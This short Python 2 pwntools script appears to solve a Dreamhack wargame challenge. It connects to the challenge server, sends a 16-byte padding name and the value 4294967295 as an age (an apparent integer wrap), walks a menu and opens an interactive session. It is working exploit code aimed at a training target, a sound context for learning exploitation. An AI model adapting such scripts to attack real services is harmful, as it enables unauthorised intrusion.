from pwn import *
#context.log_level = "debug"

payload = ""
payload += 'a'*16

r = remote("host1.dreamhack.games", 8349)

print r.recvline("> ")
r.sendline("1")
print r.recvline("Name: ")
r.sendline(payload)
print r.recvline("Age: ")
r.sendline("4294967295")
print r.recvline("> ")
r.sendline("3")
print r.recvline("> ")
r.sendline("2")
print r.recvline("Name: ")
r.interactive()



